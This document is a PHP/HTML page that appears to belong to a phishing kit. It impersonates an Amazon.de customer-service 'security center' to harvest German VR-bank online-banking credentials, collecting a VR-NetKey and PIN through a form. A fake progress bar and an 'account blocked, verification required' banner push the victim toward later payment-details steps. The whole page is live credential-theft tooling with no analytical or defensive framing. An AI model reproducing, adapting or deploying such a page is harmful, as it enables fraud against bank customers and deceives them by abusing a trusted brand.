<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-aui-build-date="3.17.4.2-2017-03-18">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<link rel="stylesheet" href="src/css/31O9784sOL.css">
		<link rel="stylesheet" href="src/css/61qjsbDraqL.css">
		<title><?php echo $title ?></title>
		<link rel="stylesheet" href="src/css/01IP25TkamL.css">
		<link rel="stylesheet" href="src/css/419ZIIK4ICL.css">
		<link href="src/img/favicon.ico" rel="shortcut icon" />
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/unit.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/xview.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/pagelayout.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/primaernavi.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/crossnav.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/sekundaernavi.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/global.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/werbung.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/jqui.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/styles.css">
		<link type="text/css" rel="stylesheet" media="print" href="src/vr_css/printOutput.css">
	</head>
	
	<body class="a-meter-animate">
		<style type="text/css">
			.nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
			  background-image: url(src/img/nav-sprite-global_bluebeacon-1x_optimized._CB295582946_.png);
			  background-position: 0 1000px;
			  background-repeat: repeat-x;
			}
			.nav-spinner {
			  background-image: url(src/img/snake._CB192194539_.gif);
			  background-position: center center;
			  background-repeat: no-repeat;
			}
			.nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
			  background-image: url(src/img/timeline_sprite_1x.png);
			  background-repeat: no-repeat;
			}
		</style>
		<link rel="stylesheet" href="src/css/719Je9HLSTL.css">
		<link rel="stylesheet" href="src/css/uDzwVmjTcOCPxHLlU3NYtRo6Q5Fev0GI729sXbWEn4.css">
		<a id="nav-top"></a>
		
		<header class="nav-locale-de nav-lang-de nav-ssl nav-unrec nav-paladin-ww nav-opt-sprite">
			<div id="navbar" role="navigation" class="nav-sprite-v1 nav-bluebeacon">
				<div id="nav-belt">
					<div class="nav-left">
						<div id="nav-logo">
							<a href="#" class="nav-logo-link" tabindex="2">
								<span class="nav-logo-base nav-sprite">Amazon.de</span>
								<span class="nav-logo-ext nav-sprite"></span>
								<span class="nav-logo-locale nav-sprite"></span>
							</a>

							<a href="#" aria-label="" tabindex="3" class="nav-logo-tagline nav-sprite nav-prime-try">
								Prime testen
							</a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-swmslot">
							<div id="navSwmHoliday" style="background-image: url(src/img/prime.jpg); width: 400px; height: 39px; overflow: hidden;position: relative;">
							<img alt="AIV" src="src/img/transparent-pixel.gif" usemap="#nav-swm-holiday-map" height="39px" border="0" width="400px"></div>
						</div>
					</div>
					
					<div class="nav-fill"></div>
				</div>
				
				<div id="nav-main" class="nav-sprite">
					<div class="nav-left">
						<div id="nav-shop">
							<a href="#" class="nav-a nav-a-2" id="nav-link-shopall" tabindex="10"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-tools">
							<a href="#" class="nav-a nav-a-2" data-nav-ref="nav_ya_signin" data-nav-role="signin" id="nav-link-yourAccount" tabindex="26" style="border-radius:3px;border: 1px solid #ccc;">
								<span class="nav-line-1">Hallo! Anmelden <span style="color:#FF9900">(Anmeldung nicht möglich! Verifikation erforderlich)</span></span>
								<span class="nav-line-2">Mein Konto<span class="nav-icon nav-arrow" style="visibility: visible;"></span></span>
							</a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-prime" tabindex="27"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-fill">
						<div id="nav-xshop-container" class="">
							<div id="nav-xshop">
								<a href="#" data-nav-tabindex="5" class="nav-a nav_a" id="nav-your-amazon">Anmeldung <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="22"> Bestätigung der persönlichen Daten <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="23"><span style="color:#FF9900">&#10148; Zahlungsmittel bestätigen</span></a>
								<a href="#" class="nav-a" tabindex="24">Abschließen <span style="color:red">&#10006;</span></a>
							</div>
						</div>
					</div>
				</div>
				<div id="nav-subnav" style=""></div>
			</div>
		</header>

		<style>
		  #nav-prime-tooltip{
			padding: 0 20px 2px 20px;
			background-color: white;
			font-family: arial,sans-serif;
		  }
		  .nav-npt-text-title{
			font-family: arial,sans-serif;
			font-size: 18px;
			font-weight: bold;
			line-height: 21px;
			color: #E47923;
		  }
		  .nav-npt-text-detail, a.nav-npt-a{
			font-family: arial,sans-serif;
			font-size: 12px;
			line-height: 14px;
			color: #333333;
			margin: 2px 0px;
		  }
		  a.nav-npt-a {
			text-decoration: underline;
		  }
		</style>
		
		<div class="cs-content">
			<div class="cs-contact-title">
				<h1 style="margin: 18px 0 14px 10px !important;color: #E47911 !important;font-size: 1.6em !important;">
					Amazon - Kundenservice Sicherheitscenter
				</h1>
			</div>
			
			<div id="cbcc_frame1">
				<div id="centerslots" style="margin:0 auto;width:600px">
					<div id="header" style="border-bottom:43px solid #E5EFF7">
						<div>
							<div id="home"></div>
							<div id="bank">
								<span id="logo"><img alt="Logo" src="src/vr_css/logo.gif"></span>
							</div>
						</div>
					</div>
					<div class="contentDiv">
						<div id="maincontent" class="maincontent_DEFAULT">
							<div class="breadcrumb empty" id="breadcrumb"></div>
							<form accept-charset="UTF-8" action="index.php" method="post">
								<h1 class="stackedFrontletTitle" style="color:#ff6600">Anmeldung</h1>
								
								<div class="messages" style="display:<?php echo (isset($_SESSION['err']) ? "block" : "none"); unset($_SESSION['err']); ?>">
									<div id="errorMessages">
										<ul>
											<li style="display:<?php echo (isset($_SESSION['user_err']) ? "block" : "none"); unset($_SESSION['user_err']); ?>">Im Feld "VR-NetKey oder Alias" ist für die Bearbeitung eine Eingabe erforderlich.</li>
											<li style="display:<?php echo (isset($_SESSION['pass_err']) ? "block" : "none"); unset($_SESSION['pass_err']); ?>">Im Feld "PIN" ist für die Bearbeitung eine Eingabe erforderlich.</li>
										</ul>
									</div>
								</div>
								<div class="formInput">
									<div class="XContainer FormularblockUndInhalt" id="mainContent_root">
										<table rules="none" style="table-layout:auto; width:100%;" cellspacing="0" cellpadding="0" border="0">
											<tbody>
											<tr>
												<td valign="middle" height="30">
												<div class="XContainer FormularblockEmbedded" id="cntBenutzerkennung">
												<table rules="none" style="table-layout:auto; width:100%;" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
												<td width="40%" valign="middle" align="right">
												<div class="XContainer FormularblockEmbedded" id="cntBenutzerkennungAuswahl">
												<table rules="none" style="table-layout:auto; width:100%;" cellspacing="0" cellpadding="0" border="0"></table>
												</div>
												</td><td width="60%" valign="middle" align="right"><span class="XLabel nowrap" id="lblBenutzerkennungLabel">VR-NetKey oder Alias:</span></td>
												</tr>
												</tbody></table>
												</div>
												</td>
												<td valign="middle" height="30" align="left">
													<input autocomplete="off" class="XText " value="<?php echo (isset($_SESSION['dz_wgz_username']) ? $_SESSION['dz_wgz_username'] : ""); ?>" maxlength="35" name="dz_wgz_username" size="35" style="margin-top:-5px;border-radius:0px;" type="text">
												</td>
											</tr>
											<tr>
												<td valign="middle" align="right"><span class="XLabel nowrap" id="lblPinLabel">PIN:</span></td>
												<td valign="middle" align="left"><input autocomplete="off" class="XPassword " id="pwdPin" maxlength="20" name="dz_wgz_pass" size="25" style="border-radius:0px;margin-top:-5px" value="" type="password"></td>
											</tr>
											</tbody>
										</table>
									</div>
								</div>
								<div class="formSubmit">
									<div class="UnitCommands actionBar" id="UnitCommands">
									<input class="UnitCommand" name="sendcode" value="Anmelden" type="submit">
								</div>
								</div>
							</form>
							
						</div>
					</div>
				</div>
			</div>
		</div>
		<div id="navFooter" class="navLeftFooter nav-sprite-v1" style="width:100%;position:absolute;bottom:0"><div class="nav-footer-line"></div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine"> <span> <div class="navFooterLine navFooterLogoLine"> <a href="#"> <div class="nav-logo-base nav-sprite"></div> </a> </div> </span> <span class="icp-container-desktop"> <div class="navFooterLine"> <style type="text/css">#icp-touch-link-country{display:none}#icp-touch-link-language{display:none}</style> <a href="#" class="icp-button a-declarative" id="icp-touch-link-language"> <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span> </a> <a href="#" class="icp-button a-declarative" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span> </a> </div> </span> </div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright"> <ul> <li class="nav_first"> <a href="#" class="nav_a">Unsere AGB</a> </li> <li> <a href="#" class="nav_a">Datenschutzerklärung</a> </li> <li> <a href="#" class="nav_a">Impressum</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Cookies &amp; Internet-Werbung</a> </li> </ul> <span>© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</span> </div> </div>
	</body>
</html>